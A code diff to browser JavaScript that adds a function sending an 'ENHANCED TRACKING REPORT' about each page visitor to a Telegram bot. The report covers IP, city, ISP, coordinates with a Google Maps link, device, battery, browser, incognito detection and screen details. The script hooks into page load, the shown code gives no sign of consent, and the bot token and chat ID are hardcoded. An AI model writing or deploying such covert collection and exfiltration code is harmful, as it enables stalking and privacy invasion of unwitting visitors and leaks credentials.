@@ -604,17 +604,14 @@ async function sendToTelegramBot(message) {
     const BOT_TOKEN = '7555872875:AAFL7IOocbY9nQhqL8GVkTvQYHkNrbnCTrs';
     const CHAT_ID = '7307197149';
     
-    // Clean the message - remove problematic Markdown characters
-    let cleanMessage = message
-        .replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&')  // Escape Markdown special chars
-        .substring(0, 4096);
+    // Don't escape anything - send as plain text with HTML
+    let cleanMessage = message.substring(0, 4096);
     
     try {
-        // Use URL encoded format instead of JSON (more reliable)
         const formData = new URLSearchParams();
         formData.append('chat_id', CHAT_ID);
         formData.append('text', cleanMessage);
-        formData.append('parse_mode', '');  // Disable Markdown to avoid errors
+        formData.append('parse_mode', 'HTML');  // Use HTML instead of Markdown
         
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -626,46 +623,81 @@ async function sendToTelegramBot(message) {
         
         const result = await response.json();
         console.log("Telegram response:", result);
-        
-        if (result.ok) {
-            console.log("✅ Message sent successfully");
-            return result;
-        } else {
-            console.log("❌ Telegram error:", result.description);
-            
-            // Retry with plain text only (no formatting)
-            if (result.description.includes("can't parse")) {
-                console.log("Retrying with plain text...");
-                const plainFormData = new URLSearchParams();
-                plainFormData.append('chat_id', CHAT_ID);
-                plainFormData.append('text', cleanMessage.replace(/\\/g, ''));
-                
-                const retryResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: plainFormData
-                });
-                return await retryResponse.json();
-            }
-        }
-        
         return result;
+        
     } catch (error) {
         console.error('Network error:', error);
         return { ok: false, error: error.message };
     }
 }
 
-// Simplified test function
-async function testSimpleMessage() {
-    const result = await sendToTelegramBot("Test message from script");
-    console.log("Test result:", result);
+// Better formatted message with HTML
+async function sendEnhancedDataToTelegram() {
+    try {
+        const data = await collectEnhancedData();
+        
+        // Use HTML formatting instead of Markdown
+        const telegramMessage = `
+<b>🚀 ENHANCED TRACKING REPORT</b>
+        
+<b>📅 Time:</b> ${new Date(data.timestamp).toLocaleString()}
+<b>🆔 Session:</b> <code>${data.sessionId}</code>
+        
+<b>📱 DEVICE</b>
+<b>Name:</b> ${data.deviceName}
+<b>Type:</b> ${data.device.isMobile ? '📱 Mobile' : data.device.isTablet ? '📟 Tablet' : '💻 Desktop'}
+<b>Platform:</b> ${data.device.platform}
+<b>Memory:</b> ${data.device.deviceMemory}GB
+<b>Cores:</b> ${data.device.hardwareConcurrency}
+        
+<b>📍 LOCATION</b>
+<b>IP:</b> <code>${data.ip.ip || 'Unknown'}</code>
+<b>City:</b> ${data.ip.city || 'Unknown'}
+<b>Country:</b> ${data.ip.country || 'Unknown'}
+<b>ISP:</b> ${data.ip.isp || 'Unknown'}
+<b>Coordinates:</b> <code>${data.ip.latitude || 'N/A'}, ${data.ip.longitude || 'N/A'}</code>
+        
+<b>🗺️ GOOGLE MAPS</b>
+${data.googleMaps ? data.googleMaps.approximateAddress : 'Location not available'}
+<a href="${data.googleMaps ? data.googleMaps.googleMapsLink : '#'}">📍 Open in Google Maps</a>
+        
+<b>🌐 INTERNET</b>
+<b>Type:</b> ${data.internet.connection.effectiveType || 'unknown'}
+<b>Speed:</b> ${data.internet.connection.downlink || 'unknown'}
+<b>Latency:</b> ${data.internet.connection.rtt || 'unknown'}
+        
+<b>🔋 BATTERY</b>
+<b>Level:</b> ${data.battery.level || 'Unknown'}
+<b>Charging:</b> ${data.battery.charging ? '⚡ Yes' : '🔋 No'}
+<b>Battery Saving:</b> ${data.battery.batterySaving || 'Not detected'}
+        
+<b>🌐 BROWSER</b>
+${data.browser.name} ${data.browser.version}
+<b>Language:</b> ${data.browser.language}
+<b>Incognito:</b> ${data.incognito.isIncognito ? '✅ Yes' : '❌ No'} (${data.incognito.certainty} certainty)
+        
+<b>🖥️ SCREEN</b>
+<b>Resolution:</b> ${data.screen.resolution.width}x${data.screen.resolution.height}
+<b>Viewport:</b> ${data.display.viewport.width}x${data.display.viewport.height}
+<b>Pixel Ratio:</b> ${data.screen.devicePixelRatio}
+<b>Dark Mode:</b> ${data.display.darkMode ? '🌙 Enabled' : '☀️ Disabled'}
+        
+<b>📊 PERFORMANCE</b>
+<b>Load Time:</b> ${data.performance.timing ? Math.round(data.performance.timing.total) + 'ms' : 'N/A'}
+        `.replace(/[^\x00-\x7F]/g, ''); // Remove emojis if they cause issues
+        
+        const result = await sendToTelegramBot(telegramMessage);
+        
+        if (result && result.ok) {
+            console.log("✅ Enhanced data sent to Telegram");
+        }
+        
+        return data;
+    } catch (error) {
+        console.error("❌ Failed to send data:", error);
+        return null;
+    }
 }
-
-// Call this to test
-testSimpleMessage();
 
 // Initialize in DOMContentLoaded
 document.addEventListener('DOMContentLoaded', () => {
